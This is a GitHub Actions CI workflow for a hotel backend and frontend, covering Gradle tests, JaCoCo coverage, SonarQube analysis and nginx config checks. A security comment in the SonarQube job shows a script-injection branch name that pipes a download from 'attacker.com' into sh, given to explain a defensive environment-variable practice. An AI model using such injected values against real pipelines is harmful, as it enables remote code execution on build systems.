# ═══════════════════════════════════════════════════════════════
# ci.yml — Continuous Integration
# Runs on: every push to any branch + every pull request
#
# Jobs:
#   test           → compile, unit + integration tests, JaCoCo coverage
#   sonar          → SonarQube analysis (needs test to finish first)
#   frontend-check → nginx.conf validation
#
# Secrets required (set in GitHub → Settings → Secrets):
#   SONAR_TOKEN        → from SonarQube project settings
#   SONAR_HOST_URL     → e.g. http://your-sonar.example.com:9000
# ═══════════════════════════════════════════════════════════════
name: CI

on:
  push:
    branches: [ "**" ]
    paths-ignore:
      - "**.md"
      - ".github/ISSUE_TEMPLATE/**"
      - "hotel-backend/k8s/**"
  pull_request:
    branches: [ main, develop ]
    paths-ignore:
      - "**.md"
      - "hotel-backend/k8s/**"

# Cancel in-flight runs of the same workflow on the same branch
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

env:
  JAVA_VERSION: "25"
  JAVA_DISTRIBUTION: "liberica"       # Liberica NIK — GraalVM-based, best Spring Boot native support

jobs:
  # ─────────────────────────────────────────────────────────────
  # JOB 1: Test + Coverage
  # ─────────────────────────────────────────────────────────────
  test:
    name: "Backend — Test & Coverage"
    runs-on: ubuntu-latest

    permissions:
      contents: read        # checkout
      checks: write         # EnricoMi/publish-unit-test-result-action → create check run
      pull-requests: write  # EnricoMi/publish-unit-test-result-action → PR comment

    steps:
      - name: Checkout
        uses: actions/checkout@v7
        with:
          # Full history needed for SonarQube blame annotations
          fetch-depth: 0

      - name: Set up Java ${{ env.JAVA_VERSION }} (Liberica NIK)
        uses: actions/setup-java@v5
        with:
          java-version: ${{ env.JAVA_VERSION }}
          distribution: ${{ env.JAVA_DISTRIBUTION }}

      # Gradle wrapper validation + dependency/build caching.
      - name: Set up Gradle
        uses: gradle/actions/setup-gradle@v4

      # Full build: compile, unit + Testcontainers integration tests, JaCoCo.
      # Docker is available on ubuntu-latest, so Testcontainers works directly.
      - name: Build, test & coverage
        working-directory: hotel-backend
        run: ./gradlew build --no-daemon

      # Upload per-module JaCoCo XML reports for the SonarQube job to consume.
      - name: Upload JaCoCo reports
        uses: actions/upload-artifact@v7
        with:
          name: jacoco-report
          path: hotel-backend/**/build/reports/jacoco/test/jacocoTestReport.xml
          retention-days: 1

      # Publish test results as a summary visible in the PR checks UI
      - name: Publish test summary
        uses: EnricoMi/publish-unit-test-result-action@v2
        if: always()
        with:
          files: "hotel-backend/**/build/test-results/test/*.xml"

  # ─────────────────────────────────────────────────────────────
  # JOB 2: SonarQube Analysis
  # ─────────────────────────────────────────────────────────────
  sonar:
    name: "Backend — SonarQube Analysis"
    runs-on: ubuntu-latest
    needs: test    # must have a green build first
    if: |
      github.event_name == 'push' ||
      (github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository)

    steps:
      - name: Checkout
        uses: actions/checkout@v7
        with:
          fetch-depth: 0

      - name: Set up Java ${{ env.JAVA_VERSION }} (Liberica NIK)
        uses: actions/setup-java@v5
        with:
          java-version: ${{ env.JAVA_VERSION }}
          distribution: ${{ env.JAVA_DISTRIBUTION }}

      - name: Set up Gradle
        uses: gradle/actions/setup-gradle@v4

      # Skip analysis entirely when SONAR_HOST_URL is not configured.
      # This prevents a misleading "URI with undefined scheme" failure on
      # forks or environments where SonarQube hasn't been set up yet.
      #
      # SECURITY: every user-controlled GitHub context expression is bound to
      # an env var here and referenced as $VAR inside the run block. Direct
      # ${{ }} interpolation in `run` scripts is a script-injection vector —
      # a branch name like "; curl attacker.com | sh #" would execute as shell
      # code if substituted literally. Environment variables are passed as data
      # and are never interpreted as shell syntax.
      - name: Run tests + SonarQube analysis
        if: ${{ secrets.SONAR_HOST_URL != '' }}
        working-directory: hotel-backend
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # User-controlled values — must NOT be used as ${{ }} in run scripts
          GH_EVENT_NAME: ${{ github.event_name }}
          GH_PR_NUMBER: ${{ github.event.pull_request.number }}
          GH_HEAD_REF: ${{ github.head_ref }}
          GH_BASE_REF: ${{ github.base_ref }}
          GH_REF_NAME: ${{ github.ref_name }}
          GH_SHA: ${{ github.sha }}
        run: |
          # Pull-request analysis: decorate the PR with inline findings.
          # Branch analysis: track the branch over time (SonarQube Developer+
          # or SonarCloud required; Community Edition only supports main).
          if [[ "$GH_EVENT_NAME" == "pull_request" ]]; then
            SONAR_EXTRA_ARGS="\
              -Dsonar.pullrequest.key=$GH_PR_NUMBER \
              -Dsonar.pullrequest.branch=$GH_HEAD_REF \
              -Dsonar.pullrequest.base=$GH_BASE_REF"
          else
            SONAR_EXTRA_ARGS="-Dsonar.branch.name=$GH_REF_NAME"
          fi

          ./gradlew build sonar --no-daemon \
            -Dsonar.host.url="$SONAR_HOST_URL" \
            -Dsonar.token="$SONAR_TOKEN" \
            -Dsonar.scm.revision="$GH_SHA" \
            $SONAR_EXTRA_ARGS

  # ─────────────────────────────────────────────────────────────
  # JOB 3: Frontend — nginx config validation
  # ─────────────────────────────────────────────────────────────
  frontend-check:
    name: "Frontend — Nginx Config Validation"
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v7

      - name: Validate nginx.conf
        run: |
          docker run --rm \
            -v "${{ github.workspace }}/hotel-frontend/nginx.conf:/etc/nginx/conf.d/default.conf:ro" \
            nginx:alpine nginx -t
